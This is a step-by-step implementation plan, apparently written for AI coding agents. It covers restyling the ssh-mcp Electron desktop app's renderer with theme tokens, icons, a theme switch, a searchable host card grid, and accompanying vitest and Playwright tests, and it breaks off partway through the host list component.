# Desktop UI Redesign Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Restyle and restructure the ssh-mcp desktop renderer: Hosts home tab with a searchable card grid, a docked collapsible AI requests column, a sectioned host editor, clearer host-key dialogs and lock screens, and dark/light/Auto themes, with four added approval-safety rules.

**Architecture:** Renderer-only change in `desktop/src/renderer/` plus one static boot script. `App.tsx` keeps its data flow; `TerminalTabs.tsx` grows a Hosts home tab and a right-hand action slot; the AI column is `ApprovalPanel` mounted only while open, docked in a CSS grid. All colour comes from CSS custom properties switched by `data-theme` on `<html>`. Pure logic (theme resolution, host filter, non-ASCII summary, password checks, shortcut matching) lives in `.ts` modules with vitest tests; behaviour is covered by Playwright e2e.

**Tech Stack:** Electron 44, React 19, xterm.js 6, Vite, vitest (node env, `renderToStaticMarkup` for components), Playwright `_electron`.

**Spec:** `docs/superpowers/specs/2026-09-25-desktop-ui-redesign-design.md` (rev 2). Product context: `PRODUCT.md`.

## Global Constraints

- No hub, protocol (`desktop/src/shared/protocol.ts`), IPC whitelist, main-process or CSP change. CSP stays `script-src 'self'` (no inline scripts).
- No new npm dependencies. System fonts only: UI `system-ui, -apple-system, "Segoe UI", sans-serif`; mono `ui-monospace, "SF Mono", Menlo, Consolas, "DejaVu Sans Mono", monospace`. Icons are inline SVG from `src/renderer/icons.tsx`.
- Components never use raw colours; only the tokens in `styles.css` (`--bg`, `--surface`, `--raised`, `--line`, `--divider`, `--text`, `--muted`, `--label`, `--accent`, `--accent-tint`, `--danger`, `--danger-fill`, `--danger-tint`, `--wait`, `--wait-tint`, `--ok`, `--term-bg`, `--term-fg`). State colours are law: red = deny/danger, amber = waiting on the user, green = connected/allow, teal (`--accent`) = focus and links only.
- The renderer never polls the hub (only `status`, on events). The host search filters in the renderer.
- Approval safety (existing, must survive): Deny is the form's only submit; Enter in Reason denies; Allow and Send to tab have `tabIndex={-1}` and `onKeyDown={blockKeyboardActivation}`; the 500 ms delay is list-wide and restarts on a new item, a list id or height change, and panel mount; `Deny all` is always rendered, disabled below 2; description and client are labelled unverified; target shown. Host-key Trust is mouse-only with the 500 ms delay and Cancel as default; the mismatch dialog has no Trust.
- Approval safety (added): Send to tab shares Allow's delay; scrolling the request list restarts the delay; an arriving request never takes focus; `Ctrl+Shift+A` (`Cmd+Shift+A` on macOS) from a terminal focuses the oldest request's Reason, `Esc` returns to the terminal.
- Accessible names/selectors the e2e tests use must hold: `Master password`, `Unlock`, `New host`, `Edit <name>`, `Delete <name>`, host open button named exactly the host name, `Lock`, `Allow`, `Deny` (exact; any `↵` hint is `aria-hidden`), `Deny all`, `Send to tab`, placeholder `Reason (optional)`, `Nothing waiting.`, `Locked after inactivity.`, `Unknown host key`, `Host editor`, `Save`, `Close` (editor footer only), `Cancel`, `Trust` (substring), `Forget host key`, `Create vault`, `New master password`, `Confirm master password`, `SHA256:` in the editor; classes `nav.hosts`, `.tabbar .tab` (name `<button>` first), `.approvals`, `.approval`, `button.allow`, `button.denyall`, `.xterm`.
- Commits end with the session trailer:
  ```
  Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
  Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2
  ```
- Checks for every task, from `desktop/`: `npm run typecheck && npm test`. E2e: `npm run build && npx playwright test <files>` (needs Go; builds `ssh-mcp` and `sshtestd` itself).
- `styles.css` is split into sections marked `/* == <name> == */`. A task replaces only the sections it names, whole.

## File map

| File | Change | Task |
|---|---|---|
| `desktop/src/renderer/theme.ts` | new: pref, resolve, storage, xterm colours | 1 |
| `desktop/public/theme-boot.js` | new: sets `data-theme` before first paint | 1 |
| `desktop/index.html` | load `./theme-boot.js` | 1 |
| `desktop/src/renderer/icons.tsx` | new: inline SVG icons, `Mark` | 1 |
| `desktop/src/renderer/ThemeControl.tsx` | new | 1 |
| `desktop/src/renderer/styles.css` | rewritten into token sections | 1–8 |
| `desktop/src/renderer/TermView.tsx` | theme prop; focus API; shortcut | 1, 5 |
| `desktop/src/renderer/terminals.ts` | `TabSet.showHome`; `approvalsKey` | 2, 5 |
| `desktop/src/renderer/TerminalTabs.tsx` | home tab, action slot, banner slot | 2, 5 |
| `desktop/src/renderer/HostList.tsx` | card grid + search | 2 |
| `desktop/src/renderer/hostForm.ts` | `filterHosts`; `secretPlaceholder` endpoint arg; `passwordChecks` | 2, 6, 8 |
| `desktop/src/renderer/App.tsx` | layout, theme, AI column state, focus, lock reason | 1, 2, 3, 5, 8 |
| `desktop/src/renderer/ApprovalPanel.tsx` | column header, delays, scroll, card | 3, 4 |
| `desktop/src/renderer/approvals.ts` | `ListChanges.touch`; `nonAsciiSummary` | 3, 4 |
| `desktop/src/renderer/HostEditor.tsx` | slide-in sheet | 6 |
| `desktop/src/renderer/HostKeyDialog.tsx` | new copy and layout | 7 |
| `desktop/src/renderer/Unlock.tsx`, `CreateVault.tsx`, `StoreError.tsx` | lock-card screens | 8 |
| `desktop/e2e/launch.ts` | `openBox` goes through the Hosts tab | 2 |
| `desktop/e2e/ui.spec.ts` | new, extended per task | 1, 2, 3, 9 |
| `desktop/e2e/hosts.spec.ts`, `keyboard.spec.ts` | selector updates, new cases | 2, 3, 5 |
| `CLAUDE.md` | desktop section | 9 |

---

### Task 1: Theme tokens, theme control, icons

**Files:**
- Create: `desktop/src/renderer/theme.ts`, `desktop/public/theme-boot.js`, `desktop/src/renderer/icons.tsx`, `desktop/src/renderer/ThemeControl.tsx`, `desktop/test/theme.test.ts`, `desktop/e2e/ui.spec.ts`
- Modify: `desktop/index.html`, `desktop/src/renderer/styles.css` (full rewrite), `desktop/src/renderer/App.tsx`, `desktop/src/renderer/TerminalTabs.tsx`, `desktop/src/renderer/TermView.tsx`

**Interfaces:**
- Produces: `type ThemePref = 'dark' | 'light' | 'auto'`; `type Theme = 'dark' | 'light'`; `THEME_KEY = 'ssh-mcp.theme'`; `resolveTheme(pref: ThemePref, prefersDark: boolean): Theme`; `parsePref(v: string | null | undefined): ThemePref`; `loadPref(storage?: Pick<Storage, 'getItem'>): ThemePref`; `savePref(pref: ThemePref, storage?: Pick<Storage, 'setItem'>): void`; `xtermTheme(theme: Theme): ITheme`; `MONO_FONT` string. `ThemeControl({ pref, onChange })`. Icons: `HomeIcon, PlusIcon, EditIcon, TrashIcon, LockIcon, CloseIcon, SunIcon, MoonIcon, TerminalIcon, WarningIcon, CheckIcon, ShieldIcon` (components, no props) and `Mark()`. `Terminals` and `TermView` take a new prop `theme: Theme`.

- [ ] **Step 1: Write the failing unit test** `desktop/test/theme.test.ts`

```ts
import { describe, expect, it } from 'vitest'
import { loadPref, parsePref, resolveTheme, savePref, THEME_KEY, xtermTheme } from '../src/renderer/theme'

describe('resolveTheme', () => {
  it('follows the OS only for auto', () => {
    expect(resolveTheme('auto', true)).toBe('dark')
    expect(resolveTheme('auto', false)).toBe('light')
    expect(resolveTheme('dark', false)).toBe('dark')
    expect(resolveTheme('light', true)).toBe('light')
  })
})

describe('theme preference storage', () => {
  it('reads dark/light, and anything else as auto', () => {
    expect(parsePref('dark')).toBe('dark')
    expect(parsePref('light')).toBe('light')
    expect(parsePref('auto')).toBe('auto')
    expect(parsePref(null)).toBe('auto')
    expect(parsePref('purple')).toBe('auto')
  })
  it('falls back to auto when storage throws, and never throws on save', () => {
    const broken = { getItem: () => { throw new Error('denied') }, setItem: () => { throw new Error('denied') } }
    expect(loadPref(broken)).toBe('auto')
    expect(() => savePref('dark', broken)).not.toThrow()
  })
  it('round-trips through storage under ssh-mcp.theme', () => {
    const m = new Map<string, string>()
    const s = { getItem: (k: string) => m.get(k) ?? null, setItem: (k: string, v: string) => { m.set(k, v) } }
    savePref('light', s)
    expect(m.get(THEME_KEY)).toBe('light')
    expect(loadPref(s)).toBe('light')
  })
})

describe('xtermTheme', () => {
  it('uses the terminal tokens of each theme', () => {
    expect(xtermTheme('dark')).toMatchObject({ background: '#0E1012', foreground: '#D8D4CC' })
    expect(xtermTheme('light')).toMatchObject({ background: '#ffffff', foreground: '#1b1f2e', yellow: '#8b6123' })
  })
})
```

- [ ] **Step 2: Run it to verify it fails**

Run (from `desktop/`): `npx vitest run test/theme.test.ts`
Expected: FAIL, cannot resolve `../src/renderer/theme`.

- [ ] **Step 3: Create `desktop/src/renderer/theme.ts`**

```ts
import type { ITheme } from '@xterm/xterm'

export type ThemePref = 'dark' | 'light' | 'auto'
export type Theme = 'dark' | 'light'
export const THEME_KEY = 'ssh-mcp.theme'
export const MONO_FONT = 'ui-monospace, "SF Mono", Menlo, Consolas, "DejaVu Sans Mono", monospace'

export function resolveTheme(pref: ThemePref, prefersDark: boolean): Theme {
  return pref === 'auto' ? (prefersDark ? 'dark' : 'light') : pref
}

export function parsePref(v: string | null | undefined): ThemePref {
  return v === 'dark' || v === 'light' ? v : 'auto'
}

// A display preference, not security state: localStorage is fine, and any
// failure (private profile, blocked storage) just means Auto.
export function loadPref(storage: Pick<Storage, 'getItem'> | undefined = globalThis.localStorage): ThemePref {
  try { return parsePref(storage?.getItem(THEME_KEY)) } catch { return 'auto' }
}

export function savePref(pref: ThemePref, storage: Pick<Storage, 'setItem'> | undefined = globalThis.localStorage): void {
  try { storage?.setItem(THEME_KEY, pref) } catch { /* display preference only */ }
}

// Mirrors --term-bg/--term-fg/--accent/--accent-tint in styles.css; keep in sync.
// Literal values, not computed styles: TermView's effects run before App sets
// data-theme, so reading CSS variables there would see the previous theme.
const LIGHT_ANSI = {
  black: '#1b1f2e', red: '#b5412f', green: '#3f7a57', yellow: '#8b6123', blue: '#2b5fb3', magenta: '#8a3fa0', cyan: '#12766f', white: '#62698a',
  brightBlack: '#474e6b', brightRed: '#b5412f', brightGreen: '#3f7a57', brightYellow: '#8b6123', brightBlue: '#2b5fb3', brightMagenta: '#8a3fa0', brightCyan: '#12766f', brightWhite: '#1b1f2e',
}

export function xtermTheme(theme: Theme): ITheme {
  return theme === 'dark'
    ? { background: '#0E1012', foreground: '#D8D4CC', cursor: '#56BFB9', selectionBackground: '#16312F' }
    : { background: '#ffffff', foreground: '#1b1f2e', cursor: '#12766F', selectionBackground: '#dcf1ec', ...LIGHT_ANSI }
}
```

- [ ] **Step 4: Run the unit test**

Run: `npx vitest run test/theme.test.ts`
Expected: PASS (5 tests).

- [ ] **Step 5: Create `desktop/public/theme-boot.js`** (Vite copies `public/` into `dist/renderer/` unchanged)

```js
// Sets data-theme before the first paint so the window never flashes the
// wrong theme; App (theme.ts) keeps it in sync afterwards. Loaded from 'self'
// because the CSP forbids inline scripts.
(function () {
  var p = 'auto'
  try { p = localStorage.getItem('ssh-mcp.theme') || 'auto' } catch (e) { /* Auto */ }
  if (p !== 'dark' && p !== 'light') p = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
  document.documentElement.dataset.theme = p
})()
```

In `desktop/index.html`, add inside `<head>` after the `<title>` line:

```html
    <script src="./theme-boot.js"></script>
```

- [ ] **Step 6: Create `desktop/src/renderer/icons.tsx`**

```tsx
import type { ReactNode } from 'react'

// 16 px line icons drawn in currentColor; decorative, so hidden from assistive tech.
const icon = (body: ReactNode) => function Icon() {
  return (
    <svg className="ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true" focusable="false">{body}</svg>
  )
}

export const HomeIcon = icon(<><path d="M3 11l9-8 9 8" /><path d="M5 10v10h14V10" /></>)
export const PlusIcon = icon(<path d="M12 5v14M5 12h14" />)
export const EditIcon = icon(<path d="M4 20h4L19 9l-4-4L4 16z" />)
export const TrashIcon = icon(<><path d="M4 7h16" /><path d="M9 7V4h6v3" /><path d="M6 7l1 13h10l1-13" /></>)
export const LockIcon = icon(<><rect x="5" y="11" width="14" height="9" rx="2" /><path d="M8 11V8a4 4 0 0 1 8 0v3" /></>)
export const CloseIcon = icon(<path d="M6 6l12 12M18 6L6 18" />)
export const SunIcon = icon(<><circle cx="12" cy="12" r="4" /><path d="M12 2v2M12 20v2M2 12h2M20 12h2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4" /></>)
export const MoonIcon = icon(<path d="M20 14.5A8 8 0 0 1 9.5 4 8 8 0 1 0 20 14.5z" />)
export const TerminalIcon = icon(<><path d="M5 8l4 4-4 4" /><path d="M12 16h7" /></>)
export const WarningIcon = icon(<><path d="M12 3l10 18H2z" /><path d="M12 10v5M12 18h.01" /></>)
export const CheckIcon = icon(<path d="M5 12l5 5 9-10" />)
export const ShieldIcon = icon(<path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6z" />)

// The app's only mark: a terminal glyph on the accent tile, then the name. No logo.
export function Mark() {
  return (
    <div className="mark">
      <span className="mark-tile"><TerminalIcon /></span>
      <span className="mark-word">ssh-mcp</span>
    </div>
  )
}
```

- [ ] **Step 7: Create `desktop/src/renderer/ThemeControl.tsx`**

```tsx
import type { ReactNode } from 'react'
import type { ThemePref } from './theme'
import { MoonIcon, SunIcon } from './icons'

const OPTIONS: { value: ThemePref; label: string; content: ReactNode }[] = [
  { value: 'dark', label: 'Dark', content: <MoonIcon /> },
  { value: 'light', label: 'Light', content: <SunIcon /> },
  { value: 'auto', label: 'Auto', content: 'Auto' },
]

export function ThemeControl({ pref, onChange }: { pref: ThemePref; onChange: (p: ThemePref) => void }) {
  return (
    <div className="seg" role="radiogroup" aria-label="Theme">
      {OPTIONS.map((o) => (
        <button key={o.value} type="button" role="radio" aria-checked={pref === o.value} aria-label={o.label}
          title={o.label} onClick={() => onChange(o.value)}>{o.content}</button>
      ))}
    </div>
  )
}
```

- [ ] **Step 8: Rewrite `desktop/src/renderer/styles.css`**

Replace the whole file. The `layout`, `hosts`, `tabs`, `approvals`, `editor`, `dialogs` and `lock` sections carry today's rules converted to tokens; later tasks replace them.

```css
/* == tokens == */
:root, :root[data-theme="dark"] {
  color-scheme: dark;
  --bg: #14171A; --surface: #1A1E22; --raised: #21262B; --line: #3A4148; --divider: #2B3137;
  --text: #ECE8E0; --muted: #8B908E; --label: #B3B5B1;
  --accent: #56BFB9; --accent-tint: #16312F;
  --danger: #F28B73; --danger-fill: #B5412F; --danger-tint: #3D1D18;
  --wait: #E9A23B; --wait-tint: #3A2C14; --ok: #6CC58F;
  --term-bg: #0E1012; --term-fg: #D8D4CC;
  --shadow: 0 8px 24px rgba(0, 0, 0, 0.45);
}
:root[data-theme="light"] {
  color-scheme: light;
  --bg: #f5f6fa; --surface: #ffffff; --raised: #eef0f6; --line: #dde0ea; --divider: #e6e8ef;
  --text: #1b1f2e; --muted: #62698a; --label: #474e6b;
  --accent: #12766F; --accent-tint: #dcf1ec;
  --danger: #B5412F; --danger-fill: #B5412F; --danger-tint: #fbe2dc;
  --wait: #8B6123; --wait-tint: #fcefdc; --ok: #3F7A57;
  --term-bg: #ffffff; --term-fg: #1b1f2e;
  --shadow: 0 8px 24px rgba(27, 31, 46, 0.12);
}

/* == base == */
* { box-sizing: border-box; }
html, body, #root { height: 100%; margin: 0; }
body { font: 13px/1.45 system-ui, -apple-system, "Segoe UI", sans-serif; background: var(--bg); color: var(--text); }
button, input, select, textarea { font: inherit; color: inherit; }
button { cursor: pointer; }
button:disabled { cursor: default; opacity: 0.45; }
:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
code, pre, kbd, .mono { font-family: ui-monospace, "SF Mono", Menlo, Consolas, "DejaVu Sans Mono", monospace; }
h1, h2, h3, h4 { margin: 0; }
p { margin: 0; }
.muted { color: var(--muted); font-size: 12px; }
.error { color: var(--danger); }
.ico { display: block; flex: none; }
.btn { height: 32px; padding: 0 12px; border-radius: 6px; border: 1px solid var(--line); background: var(--raised); font-weight: 500; display: inline-flex; align-items: center; justify-content: center; gap: 6px; }
.btn:hover:not(:disabled) { border-color: var(--muted); }
.btn.primary { background: var(--text); color: var(--bg); border-color: var(--text); font-weight: 600; }
.btn.danger-outline { background: transparent; color: var(--danger); border-color: var(--danger); }
.icon { width: 28px; height: 28px; display: inline-grid; place-items: center; border-radius: 6px; border: 0; background: transparent; color: var(--muted); }
.icon:hover:not(:disabled) { background: var(--raised); color: var(--text); }
.link { background: none; border: 0; padding: 0; color: var(--accent); font-size: 12px; }
input:not([type]), input[type="text"], input[type="password"], input[type="search"] {
  height: 34px; padding: 0 10px; border-radius: 8px; border: 1px solid var(--line); background: var(--bg); width: 100%;
}
input::placeholder { color: var(--muted); }
.chip { font-size: 10px; font-weight: 600; letter-spacing: 0.06em; padding: 1px 6px; border-radius: 4px; text-transform: uppercase; white-space: nowrap; }
.chip.ai { background: var(--accent-tint); color: var(--accent); }
.chip.wait { background: var(--wait-tint); color: var(--wait); }
.chip.danger { background: var(--danger-tint); color: var(--danger); }
.seg { display: inline-flex; border: 1px solid var(--line); border-radius: 8px; padding: 2px; gap: 2px; background: var(--bg); }
.seg button { border: 0; background: transparent; color: var(--muted); height: 26px; min-width: 30px; padding: 0 8px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; gap: 4px; font-size: 12px; }
.seg button[aria-checked="true"] { background: var(--raised); color: var(--text); }
kbd { font-size: 11px; padding: 0 4px; border-radius: 4px; background: rgba(255, 255, 255, 0.18); }
.mark { display: flex; align-items: center; gap: 8px; font-weight: 600; letter-spacing: -0.01em; }
.mark-tile { width: 28px; height: 28px; border-radius: 6px; display: grid; place-items: center; background: var(--accent-tint); color: var(--accent); }
@media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation: none !important; transition: none !important; } }

/* == layout == */
.app { height: 100%; }
.center { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 8px; }
.layout { height: 100%; display: grid; grid-template-rows: auto 36px 1fr; grid-template-columns: 200px 1fr 360px; }
.store-error { grid-column: 1 / 4; grid-row: 1; padding: 6px 12px; background: var(--danger-tint); color: var(--danger); }
.layout > .hosts, .layout > .work, .layout > .approvals { grid-row: 3; }
.layout > header { grid-row: 2; grid-column: 1 / 4; display: flex; justify-content: space-between; align-items: center; gap: 8px; padding: 0 12px; background: var(--surface); border-bottom: 1px solid var(--divider); }
.layout > header .spacer { flex: 1; }
.work { overflow: hidden; }
.stderr { max-width: 80%; max-height: 50%; overflow: auto; background: var(--term-bg); padding: 8px; }

/* == hosts == */
.hosts { overflow: auto; background: var(--surface); border-right: 1px solid var(--divider); }
.hosts ul { list-style: none; padding: 0 8px; margin: 0; }
.hosts li { display: flex; gap: 6px; align-items: center; margin: 4px 0; }
.hosts button { flex: 1; text-align: left; background: none; color: inherit; border: 0; cursor: pointer; padding: 4px; }
.badge { font-size: 10px; padding: 1px 4px; border-radius: 3px; background: var(--accent-tint); color: var(--accent); }
.badge.warn { background: var(--wait-tint); color: var(--wait); }
.hosts .new, .hosts button.small { flex: none; }
.hosts .new { margin: 0 8px 4px; padding: 4px 8px; border: 1px solid var(--line); }
.hosts button.small { font-size: 11px; color: var(--muted); padding: 2px 4px; }
.hosts footer { padding: 8px; word-break: break-all; }

/* == tabs == */
.terms { height: 100%; display: flex; flex-direction: column; }
.tabbar { display: flex; gap: 2px; background: var(--surface); overflow-x: auto; }
.tab { display: flex; align-items: center; background: var(--raised); }
.tab.active { background: var(--term-bg); }
.tab button { background: none; color: inherit; border: 0; padding: 6px 8px; cursor: pointer; }
.termarea { flex: 1; position: relative; background: var(--term-bg); }
.term { position: absolute; inset: 0; padding: 4px 8px; }

/* == approvals == */
.approvals { overflow: auto; background: var(--surface); border-left: 1px solid var(--divider); padding: 0 8px; }
.approval { border: 1px solid var(--line); border-radius: 8px; padding: 8px; margin: 8px 0; display: flex; flex-direction: column; gap: 6px; background: var(--raised); }
.cmd { white-space: pre-wrap; word-break: break-all; background: var(--term-bg); padding: 6px; margin: 0; }
.cmd mark { background: var(--wait); color: var(--bg); unicode-bidi: isolate; }
.desc { font-size: 12px; font-style: italic; color: var(--label); }
.actions { display: flex; gap: 6px; }
.actions .deny { background: var(--danger-fill); color: #fff; border: 0; }
.actions .allow { background: transparent; color: var(--ok); border: 1px solid var(--ok); }

/* == editor == */
.link-legacy { color: var(--accent); }
.warn-text { color: var(--wait); font-size: 12px; }

/* == dialogs == */
.modal { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.5); display: flex; align-items: center; justify-content: center; z-index: 10; }
.dialog { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 12px 16px; width: 460px; max-height: 90%; overflow: auto; display: flex; flex-direction: column; gap: 6px; }
.dialog label { display: flex; flex-direction: column; gap: 2px; font-size: 12px; }
.dialog label.check { flex-direction: row; align-items: center; gap: 6px; }
.dialog .row { display: flex; gap: 6px; align-items: flex-end; }
.dialog .row label { flex: 1; }
.dialog.mismatch { border-color: var(--danger); }
.mismatch-text { color: var(--danger); }

/* == lock == */
.unlock { display: flex; flex-direction: column; gap: 8px; width: 280px; }
```

- [ ] **Step 9: Wire the theme in `App.tsx`**

Add imports:

```ts
import { loadPref, resolveTheme, savePref, type ThemePref } from './theme'
import { ThemeControl } from './ThemeControl'
```

Inside `App()`, after the existing `useState` lines, add:

```ts
  const [themePref, setThemePref] = useState<ThemePref>(() => loadPref())
  const [prefersDark, setPrefersDark] = useState(() => matchMedia('(prefers-color-scheme: dark)').matches)
  useEffect(() => {
    const m = matchMedia('(prefers-color-scheme: dark)')
    const on = (e: MediaQueryListEvent) => setPrefersDark(e.matches)
    m.addEventListener('change', on)
    return () => m.removeEventListener('change', on)
  }, [])
  const theme = resolveTheme(themePref, prefersDark)
  useEffect(() => { document.documentElement.dataset.theme = theme }, [theme])
  const chooseTheme = (p: ThemePref) => { setThemePref(p); savePref(p) }
```

Replace the `<header>` element with:

```tsx
          <header>
            <span>ssh-mcp</span>
            <span className="spacer" />
            <ThemeControl pref={themePref} onChange={chooseTheme} />
            <button onClick={async () => { try { await hub.lock(); setUnlockError(undefined); await refresh() } catch { /* the locked/hub-state events recover the UI */ } }}>Lock</button>
          </header>
```

Pass the theme to terminals: `<Terminals ref={terms} theme={theme} hostKeys={hostKeys} onMismatch={setMismatch} onTrusted={reloadServers} />`.

- [ ] **Step 10: Thread `theme` into `TerminalTabs.tsx` and `TermView.tsx`**

`TerminalTabs.tsx`: add `import type { Theme } from './theme'`, add `theme: Theme` to the `forwardRef` props type and destructuring, and pass `theme={theme}` to each `<TermView>`.

`TermView.tsx`: add `import { MONO_FONT, xtermTheme, type Theme } from './theme'`; add `theme: Theme` to the props type and destructuring. Replace the `new Terminal(...)` line with:

```ts
    const term = new Terminal({ convertEol: false, fontFamily: MONO_FONT, fontSize: 13, lineHeight: 1.25, theme: xtermTheme(theme) })
```

and add, next to the existing `useEffect(() => { if (visible) ... }, [visible])`:

```ts
  useEffect(() => { if (termRef.current) termRef.current.options.theme = xtermTheme(theme) }, [theme])
```

- [ ] **Step 11: Create `desktop/e2e/ui.spec.ts`** (tests in this file run in order against one app; each later task appends a test)

```ts
import { test, expect, type Page } from '@playwright/test'
import { launch, unlock, type Launched } from './launch'

// Redesign behaviour (spec 2026-09-25-desktop-ui-redesign-design.md). The tests
// share one app and run in order; the first one unlocks it.
test.skip(process.platform === 'win32', 'the launcher and door client are Unix-only')

let l: Launched
let win: Page
test.beforeAll(async () => {
  l = await launch()
  win = await l.app.firstWindow()
  await l.app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].setSize(1280, 720))
})
test.afterAll(async () => { await l?.close() })

test('the theme control switches data-theme and remembers the choice', async () => {
  const html = win.locator('html')
  await expect(html).toHaveAttribute('data-theme', /^(dark|light)$/) // set by theme-boot.js before React
  await unlock(win)
  await win.getByRole('radio', { name: 'Light' }).click()
  await expect(html).toHaveAttribute('data-theme', 'light')
  expect(await win.evaluate(() => localStorage.getItem('ssh-mcp.theme'))).toBe('light')
  await win.getByRole('radio', { name: 'Dark' }).click()
  await expect(html).toHaveAttribute('data-theme', 'dark')
  await win.getByRole('radio', { name: 'Auto' }).click()
  expect(await win.evaluate(() => localStorage.getItem('ssh-mcp.theme'))).toBe('auto')
})
```

- [ ] **Step 12: Run all checks**

Run: `npm run typecheck && npm test && npm run build && npx playwright test e2e/ui.spec.ts e2e/smoke.spec.ts`
Expected: typecheck clean; vitest all pass; both e2e specs pass. Also confirm `dist/renderer/theme-boot.js` exists after the build.

- [ ] **Step 13: Commit**

```bash
git add desktop/src/renderer/theme.ts desktop/public/theme-boot.js desktop/index.html desktop/src/renderer/icons.tsx desktop/src/renderer/ThemeControl.tsx desktop/src/renderer/styles.css desktop/src/renderer/App.tsx desktop/src/renderer/TerminalTabs.tsx desktop/src/renderer/TermView.tsx desktop/test/theme.test.ts desktop/e2e/ui.spec.ts
git commit -m "feat(desktop): theme tokens with dark, light and Auto

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2"
```

---

### Task 2: Tab strip with the Hosts home tab and the host card grid

**Files:**
- Modify: `desktop/src/renderer/terminals.ts`, `desktop/src/renderer/hostForm.ts`, `desktop/src/renderer/HostList.tsx` (rewrite), `desktop/src/renderer/TerminalTabs.tsx`, `desktop/src/renderer/App.tsx`, `desktop/src/renderer/styles.css` (sections `layout`, `hosts`, `tabs`), `desktop/e2e/launch.ts`, `desktop/e2e/hosts.spec.ts`, `desktop/e2e/ui.spec.ts`
- Test: `desktop/test/terminals.test.ts`, `desktop/test/hostForm.test.ts`

**Interfaces:**
- Consumes: `Theme`, `ThemeControl`, icons (Task 1).
- Produces: `TabSet.showHome(): void`; `filterHosts(servers: ServerInfo[], query: string): ServerInfo[]`; `Terminals` props `home: ReactNode`, `actions: ReactNode`, `banner: ReactNode`, `servers: ServerInfo[]` (in addition to `theme`, `hostKeys`, `onMismatch`, `onTrusted`). Layout classes: `.shell` (grid: `minmax(0,1fr) auto`), `main.work` in its first column. Tab bar classes: `.tabbar`, `.hometab`, `.tab`, `.tabbar-actions`.

- [ ] **Step 1: Write failing unit tests**

Append to `desktop/test/terminals.test.ts` inside the existing `describe('TabSet', ...)`:

```ts
  it('shows the Hosts home when asked and after the last tab closes', () => {
    const s = new TabSet()
    const a = s.open('box')
    expect(s.active).toBe(a.id)
    s.showHome()
    expect(s.active).toBeUndefined()
    s.activate(a.id)
    s.close(a.id)
    expect(s.active).toBeUndefined()
  })
```

Append to `desktop/test/hostForm.test.ts` (add `filterHosts` to its import from `../src/renderer/hostForm`):

```ts
describe('filterHosts', () => {
  const other: ServerInfo = { ...box, name: 'db-primary', host: '10.0.4.30', user: 'postgres' }
  it('matches name, host or user, case-insensitively; empty query keeps all', () => {
    expect(filterHosts([box, other], '')).toEqual([box, other])
    expect(filterHosts([box, other], '  ')).toEqual([box, other])
    expect(filterHosts([box, other], 'DB')).toEqual([other])
    expect(filterHosts([box, other], '10.0.4')).toEqual([other])
    expect(filterHosts([box, other], 'postgres')).toEqual([other])
    expect(filterHosts([box, other], 'nothing')).toEqual([])
  })
})
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run test/terminals.test.ts test/hostForm.test.ts`
Expected: FAIL (`showHome` is not a function; `filterHosts` not exported).

- [ ] **Step 3: Implement**

In `terminals.ts`, add to `class TabSet` after `activate`:

```ts
  // No terminal active: the Hosts home tab shows.
  showHome() { this.active = undefined }
```

In `hostForm.ts`, append:

```ts
// The Hosts search: a substring of the name, host or user, ignoring case.
// Renderer-only, so typing never calls the hub (and never resets the idle lock).
export function filterHosts(servers: ServerInfo[], query: string): ServerInfo[] {
  const q = query.trim().toLowerCase()
  if (!q) return servers
  return servers.filter((s) => [s.name, s.host, s.user].some((f) => f.toLowerCase().includes(q)))
}
```

- [ ] **Step 4: Run the unit tests**

Run: `npx vitest run test/terminals.test.ts test/hostForm.test.ts`
Expected: PASS.

- [ ] **Step 5: Rewrite `desktop/src/renderer/HostList.tsx`**

```tsx
import { useState } from 'react'
import type { ServerInfo } from '../shared/protocol'
import { filterHosts } from './hostForm'
import { EditIcon, PlusIcon, TrashIcon } from './icons'

export function HostList({ servers, storePath, onOpen, onNew, onEdit, onDelete }: {
  servers: ServerInfo[]; storePath: string
  onOpen: (name: string) => void; onNew: () => void; onEdit: (name: string) => void; onDelete: (name: string) => void
}) {
  const [query, setQuery] = useState('')
  const shown = filterHosts(servers, query)
  return (
    <nav className="hosts" aria-label="Hosts">
      <div className="hosts-head">
        <input type="search" placeholder="Search hosts" aria-label="Search hosts" value={query}
          onChange={(e) => setQuery(e.target.value)} />
        <button type="button" className="btn" onClick={onNew}><PlusIcon />New host</button>
      </div>
      <h2 className="section-label">{`Hosts · ${shown.length}`}</h2>
      {servers.length === 0 ? (
        <p className="empty">No hosts yet. Add one with New host.</p>
      ) : shown.length === 0 ? (
        <p className="empty">{`No hosts match "${query.trim()}"`}</p>
      ) : (
        <ul className="hostgrid">
          {shown.map((s) => (
            <li key={s.name} className="hostcard">
              {/* The card is the open button; its name is exactly the host name. */}
              <button type="button" className="hostcard-open" aria-label={s.name} onClick={() => onOpen(s.name)}>
                <span className="tile" aria-hidden="true">{s.name.slice(0, 1).toUpperCase()}</span>
                <span className="hostcard-text">
                  <span className="hostcard-name">
                    {s.name}
                    {s.aiVisible && <span className="chip ai">AI</span>}
                    {!s.hostKey && <span className="chip wait">New key</span>}
                  </span>
                  <span className="hostcard-addr mono">{`${s.user}@${s.host}:${s.port}`}</span>
                </span>
              </button>
              <span className="hostcard-actions">
                <button type="button" className="icon" aria-label={`Edit ${s.name}`} title="Edit" onClick={() => onEdit(s.name)}><EditIcon /></button>
